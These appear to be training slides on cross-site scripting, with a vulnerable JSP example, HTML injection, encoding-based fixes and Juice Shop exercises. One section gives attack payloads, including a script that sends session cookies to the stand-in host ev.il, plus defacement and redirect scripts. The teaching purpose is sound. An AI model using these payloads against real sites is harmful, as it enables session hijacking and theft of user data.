# XSS

## (Cross-Site Scripting)

---

# [Cross-Site Scripting](https://owasp.org/www-community/attacks/xss/)

* An attacker can use XSS to send a malicious script to an unsuspecting
  user
* The end user’s browser has no way to know that the script should not
  be trusted, and will execute the script
* Because it thinks the script came from a trusted source, the malicious
  script can access any cookies, session tokens, or other sensitive
  information retained by the browser and used with that site
* These scripts can even rewrite the content of the HTML page

---

# Root Cause

Web applications vulnerable to XSS...

1. ...include untrusted data (usually from an HTTP request) into dynamic
   content...
2. ...that is then sent to a web user _without previously validating for
   malicious content_

_:information_source: XSS originally had its own category, e.g. [A7:2017-Cross-Site Scripting (XSS)](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html). Since 2021 it is considered part of the [Injection](01-01-injection.md) category._

# Typical Impact

* Steal user's session
* Steal sensitive data
* Rewrite the web page
* Redirect user to malicious website

[![Shaking XSS demo on Juice Shop](images/01-03-xss/shake_js-preview.png)](https://youtu.be/Msi52Kicb-w)

:information_source: _This video shows how severe the impact of XSS can
be: It makes the application shake & dance **and** lets a keylogger
steal user credentials!_

# :x: Vulnerable Code Example

```
<!--search.jsp-->

<%String searchCriteria = request.getParameter("searchValue");%>
```

might forward to the following page when executing the search:

```
<!--results.jsp-->

Search results for <b><%=searchCriteria%></b>:

<table>
<!-- Render the actual results table here -->
</table>
```

---

# Benign Usage

` https://my-little-application.com/search.jsp?searchValue=blablubb `

results in the following HTML on the `results.jsp` page:

```html
Search results for <b>blablubb</b>:
```

rendering as:

<hr>

Search results for <b>blablubb</b>:

---

# Exploit Example (HTML Injection)

` https://my-little-application.com/search.jsp?searchValue=</b><img
src="https://placekitten.com/g/100/100"/><b> `

results in the following HTML on the `results.jsp` page:

```html
Search results for
  <b></b><img src="https://placekitten.com/g/100/100"/><b></b>:
```

rendering as:

<hr>

Search results for <b></b><img
src="https://placekitten.com/g/100/100"/><b></b>:

# XSS Attack Payload Examples

#### Stealing User Session

```
<script>
  new Image().src="http://ev.il/hijack.php?c="+encodeURI(document.cookie);
</script>
```

#### Site Defacement

```
<script>document.body.background="http://ev.il/image.jpg";</script>
```

#### Redirect

```
<script>window.location.assign("http://ev.il");</script>
```

# Forms of XSS

* **Reflected XSS**: Application includes unvalidated and unescaped user
  input as part of HTML output
* **Stored XSS**: Application stores unsanitized user input that is
  viewed at a later time by another user
* **DOM XSS**: JavaScript frameworks & single-page applications
  dynamically include attacker-controllable data to a page

_:information_source: The previous example vulnerability and exploit of
`results.jsp` is a typical Reflected XSS._

# Exercise 2.1

1. Identify places where user input is _directly_ included in the output
2. Perform a successful _DOM XSS_ attack (:star:)
3. Perform a successful _Reflected XSS_ attack (:star::star:)

_:warning: Make sure that you really understand the subtle difference
between those two underlying vulnerabilities._

# [Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

* **Do not include user supplied input in your output!** :100:

<!-- -->

* **Output Encode** all user supplied input
  * e.g. OWASP Java Encoder
* Perform **Allow List Input Validation** on user input

<!-- -->

* Use an HTML Sanitizer for larger user supplied HTML chunks
  * e.g. OWASP Java HTML Sanitizer

---

# :heavy_check_mark: Fixed Code Example

Using `Encoder` from
[OWASP Java Encoder Project](https://wiki.owasp.org/index.php/OWASP_Java_Encoder_Project):

```
<%import org.owasp.encoder.Encode;%>

Search results for <b><%=Encode.forHtml(searchCriteria)%></b>:
<!-- ... -->
```

Same result using `HtmlUtils` from the popular Spring framework:

```
<%import org.springframework.web.util.HtmlUtils;%>

Search results for <b><%=HtmlUtils.htmlEscape(searchCriteria)%></b>:
<!-- ... -->
```

---

# [Encoding Contexts](https://wiki.owasp.org/index.php/OWASP_Java_Encoder_Project#tab=Use_the_Java_Encoder_Project)

### HTML Content

```
<textarea name="text"><%= Encode.forHtmlContent(UNTRUSTED) %></textarea>
```

#### HTML Attribute

```
<input type="text"
       name="address"
       value="<%= Encode.forHtmlAttribute(UNTRUSTED) %>" />
```

_Alternatively_ `Encode.forHtml(UNTRUSTED)` _can be used for both the
above contexts but is less efficient as it encodes more characters._

---

### JavaScript

```
<script type="text/javascript">
 var msg = "<%= Encode.forJavaScriptBlock(UNTRUSTED) %>";
 alert(msg);
</script>
```

#### JavaScript Variable

```
<button onclick="alert('<%= Encode.forJavaScriptAttribute(UNTRUSTED) %>');">
 click me
</button>
```

_Alternatively_ `Encode.forJavaScript(UNTRUSTED)` _can be used for both
the above contexts but is less efficient as it encodes more characters._

---

### CSS

```
<div style="width:<= Encode.forCssString(UNTRUSTED) %>">
<div style="background:<= Encode.forCssUrl(UNTRUSTED) %>">
```

### URL Parameter

```
<a href="/search?value=<%= Encode.forUriComponent(UNTRUSTED) %>&order=1#top">
<a href="/page/<%= Encode.forUriComponent(UNTRUSTED) %>">
```

# [OWASP Java HTML Sanitizer](https://wiki.owasp.org/index.php/OWASP_Java_HTML_Sanitizer_Project)

Fast and easy to configure HTML Sanitizer written in Java which lets you
include HTML authored by third-parties in your web application while
protecting against XSS.

## Using a simple pre-packaged policy

```java
private String sanitizeHtml(String html) {
  PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.BLOCKS)
				              .and(Sanitizers.LINKS);
  return policy.sanitize(html);
}
```

---

## Custom Sanitization Policy

```java
private static final PolicyFactory BASIC_FORMATTING_WITH_LINKS_POLICY =
  new HtmlPolicyBuilder()
  .allowCommonInlineFormattingElements().allowCommonBlockElements()
  .allowAttributes("face", "color", "size", "style").onElements("font")
  .allowAttributes("style").onElements("div", "span").allowElements("a")
  .allowAttributes("href").onElements("a").allowStandardUrlProtocols()
  .requireRelNofollowOnLinks().toFactory();
```

_This custom policy actually reflects the features of a 3rd-party rich
text editor widget for GWT applications the author once used._

# Input Validation

## Block List

* **"Allow what is not explicitly blocked!"**
  * Example: Do not allow `<`, `>`, `"`, `;`, `'` and `script` in user
    input (:interrobang:)

<!-- -->

* Can be bypassed by masking attack patterns
* Must be updated for new attack patterns

**= Negative Security Rule**

---

## Allow List

* **"Block what is not explicitly allowed!"**
  * Example: Allow only `a-z`, `A-Z` and `0-9` in user input

<!-- -->

* Provide protection even against future vulnerabilities
* Tend to get weaker over time when not carefully maintained
* Can be quite effortsome to define for a whole application

**= Positive Security Rule**

---

# "Client Side Validation"

![Turnstyle with a trivial bypass](images/01-03-xss/client-side-validation.jpg)

---

# Bypassing Client Side Validation

* Client Side Validation is _always_ for _convenience_ but **never** for
  **security**!
* You can just stop all outgoing HTTP requests in your browser...
  * ...and tamper with contained headers, data or passed parameters
  * ..._after_ Client Side Validation took place
  * ...but _before_ they are actually submitted to the server
* Sometimes you can just bypass the client entirely and interact with
  the backend instead

---

# Exercise 2.2 (:house:)

1. Identify places where _stored_ user input is displayed elsewhere
2. Perform any _Stored XSS_ attack successfully (:star::star: -
   :star::star::star::star::star::star:)
3. Visit the page where the attack gets executed to verify your success

_:information_source: If your attack seems to be blocked or otherwise
prevented, you can either try to somehow beat the security mechanism or
just find an easier target! You can always come back to the harder
challenges with more knowledge on how to bypass certain security
controls._
